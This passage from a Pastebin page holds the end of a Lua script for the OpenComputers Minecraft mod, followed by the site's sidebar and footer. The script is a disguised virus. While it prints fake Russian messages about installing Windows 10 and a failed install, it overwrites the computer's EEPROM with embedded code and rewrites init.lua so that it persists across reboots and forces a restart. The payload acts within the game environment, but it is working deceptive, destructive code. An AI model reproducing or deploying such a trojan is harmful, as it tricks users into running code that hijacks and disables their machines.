-    return load(buffer, &quot;=&quot; .. file)
-  end
-
-  local function dofile(file)
-    local program, reason = loadfile(file)
-    if program then
-      local result = table.pack(pcall(program))
-      if result[1] then
-        return table.unpack(result, 2, result.n)
-      else
-        error(result[2])
-      end
-    else
-      error(reason)
-    end
-  end
-
-  status(&quot;Initializing package management...&quot;)
-
-  -- Load file system related libraries we need to load other stuff moree
-  -- comfortably. This is basically wrapper stuff for the file streams
-  -- provided by the filesystem components.
-  local package = dofile(&quot;/lib/package.lua&quot;)
-
-  do
-    -- Unclutter global namespace now that we have the package module.
-    --_G.component = nil
-    _G.computer = nil
-    _G.process = nil
-    _G.unicode = nil
-
-    -- Initialize the package module with some of our own APIs.
-    package.preload[&quot;buffer&quot;] = loadfile(&quot;/lib/buffer.lua&quot;)
-    package.preload[&quot;component&quot;] = function() return component end
-    package.preload[&quot;computer&quot;] = function() return computer end
-    package.preload[&quot;filesystem&quot;] = loadfile(&quot;/lib/filesystem.lua&quot;)
-    package.preload[&quot;io&quot;] = loadfile(&quot;/lib/io.lua&quot;)
-    package.preload[&quot;unicode&quot;] = function() return unicode end
-
-    -- Inject the package and io modules into the global namespace, as in Lua.
-    _G.package = package
-    _G.io = require(&quot;io&quot;)
-       
-  end
-
-  status(&quot;Initializing file system...&quot;)
-
-  -- Mount the ROM and temporary file systems to allow working on the file
-  -- system module from this point on.
-  local filesystem = require(&quot;filesystem&quot;)
-  filesystem.mount(computer.getBootAddress(), &quot;/&quot;)
-
-  status(&quot;Running boot scripts...&quot;)
-
-  -- Run library startup scripts. These mostly initialize event handlers.
-  local scripts = {}
-  for _, file in rom.inits() do
-    local path = &quot;boot/&quot; .. file
-    if not rom.isDirectory(path) then
-      table.insert(scripts, path)
-    end
-  end
-  table.sort(scripts)
-  for i = 1, #scripts do
-    dofile(scripts[i])
-  end
-
-  status(&quot;Initializing components...&quot;)
-
-  local primaries = {}
-  for c, t in component.list() do
-    local s = component.slot(c)
-    if (not primaries[t] or (s &gt;= 0 and s &lt; primaries[t].slot)) and t ~= &quot;screen&quot; then
-      primaries[t] = {address=c, slot=s}
-    end
-    computer.pushSignal(&quot;component_added&quot;, c, t)
-  end
-  for t, c in pairs(primaries) do
-    component.setPrimary(t, c.address)
-  end
-  os.sleep(0.5) -- Allow signal processing by libraries.
-  --computer.pushSignal(&quot;init&quot;) -- so libs know components are initialized.
-
- -- status(&quot;Initializing system...&quot;)
-  --require(&quot;term&quot;).clear()
-  os.sleep(0.1) -- Allow init processing.
-  runlevel = 1
-end
-]]
-
-local component = require(&quot;component&quot;)
-local args = { ... }
-
-local function flashEEPROM()
-  local eeprom = component.getPrimary(&quot;eeprom&quot;)
-  eeprom.set(EEPROMCode)
-  eeprom.setLabel(EEPROMLabel)
-end
-
-local function rewriteInit()
-  local file = io.open(&quot;init.lua&quot;, &quot;w&quot;)
-  file:write(INITCode, &quot;\n&quot;, &quot;\n&quot;)
-  file:write(&quot;pcall(loadfile(\&quot;&quot; .. virusPath .. &quot;\&quot;), \&quot;flashEEPROM\&quot;)&quot;, &quot;\n&quot;, &quot;\n&quot;)
-  file:write(&quot;require(\&quot;computer\&quot;).shutdown(true)&quot;)
-  file:close()
-end
-
-if args[1] == &quot;flashEEPROM&quot; then
-  flashEEPROM()
-else
-  print(&quot;копирование файлов&quot;)
-  print(&quot;Установка Windows 10...&quot;)
-  flashEEPROM()
-  print(&quot;прошивка биоса...&quot;)
-  rewriteInit()
-  print(&quot;почти готово &quot;)
-  print(&quot;ошибка установки!&quot;)
-  print(&quot;рестартни &quot;)
-end</textarea>
-    
-        
-</div>            <div style="clear: both;"></div>
-
-                                </div>
-
-        <div class="sidebar h_1024">
-            
-
-
-
-                
-    <div class="sidebar__title">
-        <a href="/archive">Public Pastes</a>
-    </div>
-    <ul class="sidebar__menu">
-
-                    <li>
-                <a href="/L0xECxTa">minimum-cost-to-move-chips-to-the-same-positi...</a>
-                <div class="details">
-                                            Swift |
-                    
-                    6 min ago
-                    | 1.30 KB                </div>
-            </li>
-                    <li>
-                <a href="/j7D58Lrp">Untitled</a>
-                <div class="details">
-                                            Python |
-                    
-                    9 min ago
-                    | 0.48 KB                </div>
-            </li>
-                    <li>
-                <a href="/ZZitmDX9">2022-01-22_stats.json</a>
-                <div class="details">
-                                            JSON |
-                    
-                    44 min ago
-                    | 13.51 KB                </div>
-            </li>
-                    <li>
-                <a href="/hwP6y1jG">Untitled</a>
-                <div class="details">
-                                            PowerShell |
-                    
-                    54 min ago
-                    | 3.83 KB                </div>
-            </li>
-                    <li>
-                <a href="/13GKRR1t">Paste Ping</a>
-                <div class="details">
-                                            C |
-                    
-                    58 min ago
-                    | 0.02 KB                </div>
-            </li>
-                    <li>
-                <a href="/xTuM85ax">b tree bugged</a>
-                <div class="details">
-                                            C++ |
-                    
-                    1 hour ago
-                    | 4.41 KB                </div>
-            </li>
-                    <li>
-                <a href="/EkXYqJUA">Computercraft - Color Test Image</a>
-                <div class="details">
-                                            Lua |
-                    
-                    2 hours ago
-                    | 0.09 KB                </div>
-            </li>
-                    <li>
-                <a href="/tq4f8MEp">OC_CubeMiningTurtle</a>
-                <div class="details">
-                                            Lua |
-                    
-                    2 hours ago
-                    | 7.58 KB                </div>
-            </li>
-        
-    </ul>
-            
-
-    <div class="sidebar__sticky -on">
-                    </div>
-        </div>
-    </div>
-</div>
-
-
-    
-<div class="top-footer">
-    <a class="icon-link -size-24-24 -chrome" href="/tools#chrome" title="Google Chrome Extension"></a>
-    <a class="icon-link -size-24-24 -firefox" href="/tools#firefox" title="Firefox Extension"></a>
-    <a class="icon-link -size-24-24 -iphone" href="/tools#iphone" title="iPhone/iPad Application"></a>
-    <a class="icon-link -size-24-24 -windows" href="/tools#windows" title="Windows Desktop Application"></a>
-    <a class="icon-link -size-24-24 -android" href="/tools#android" title="Android Application"></a>
-    <a class="icon-link -size-24-24 -macos" href="/tools#macos" title="MacOS X Widget"></a>
-    <a class="icon-link -size-24-24 -opera" href="/tools#opera" title="Opera Extension"></a>
-    <a class="icon-link -size-24-24 -unix" href="/tools#pastebincl" title="Linux Application"></a>
-</div>
-
-<footer class="footer">
-    <div class="container">
-        <div class="footer__container">
-
-            <div class="footer__left">
-                <a href="/">create new paste</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                                <a href="/languages">syntax languages</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/archive">archive</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/faq">faq</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/tools">tools</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/night_mode">night mode</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/doc_api">api</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/doc_scraping_api">scraping api</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/news">news</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/pro" class="pro">pro</a>
-
-                <br>
-                <a href="/doc_privacy_statement">privacy statement</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/doc_cookies_policy">cookies policy</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/doc_terms_of_service">terms of service</a><sup style="color:#999">updated</sup> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/doc_security_disclosure">security disclosure</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/dmca">dmca</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/report-abuse">report abuse</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
-                <a href="/contact">contact</a>
-
-                <br>
-
-                                
-                <br>
-
-                
-<span class="footer__bottom h_800">
-    By using Pastebin.com you agree to our <a href="/doc_cookies_policy">cookies policy</a> to enhance your experience.
-    <br>
-    Site design &amp; logo &copy; 2022 Pastebin</span>
-            </div>
-
-            <div class="footer__right h_1024">
-                                    <a class="icon-link -size-40-40 -facebook-circle" href="https://facebook.com/pastebin" rel="nofollow" title="Like us on Facebook" target="_blank"></a>
-                    <a class="icon-link -size-40-40 -twitter-circle" href="https://twitter.com/pastebin" rel="nofollow" title="Follow us on Twitter" target="_blank"></a>
-                            </div>
-
-        </div>
-    </div>
-</footer>
-    
-
-
-    
-<div class="popup-container">
-
-                <div class="popup-box -cookies" data-name="l2c_1">
-            We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the <a href="/doc_cookies_policy">Cookies Policy</a>.            &nbsp;<span class="cookie-button js-close-cookies">OK, I Understand</span>
-        </div>
-    
-                <div class="popup-box -pro" data-name="l2c_2_pg">
-            <div class="pro-promo-img">
-                <a href="/signup">
-                    <img src="/themes/pastebin/img/hello.png" alt=""/>
-                </a>
-            </div>
-            <div class="pro-promo-text">
-                Not a member of Pastebin yet?<br/>
-                <a href="/signup"><b>Sign Up</b></a>, it unlocks many cool features!            </div>
-            <div class="close js-close-pro-guest" title="Close Me">&nbsp;</div>
-        </div>
-    
-    
-    
-</div>
-    
-
-<span class="cd-top"></span>
-
-<script src="/assets/9ce1885/jquery.min.js"></script>
-<script src="/assets/f04f76b8/yii.js"></script>
-<script>
-    const POST_EXPIRATION_NEVER = 'N';
-    const POST_EXPIRATION_BURN = 'B';
-    const POST_STATUS_PUBLIC = '0';
-    const POST_STATUS_UNLISTED = '1';
-</script>
-<script src="/themes/pastebin/js/vendors.bundle.js?ec0a0b6023b5e6c9982d"></script>
-<script src="/themes/pastebin/js/app.bundle.js?ec0a0b6023b5e6c9982d"></script>
-
-</body>
-</html>
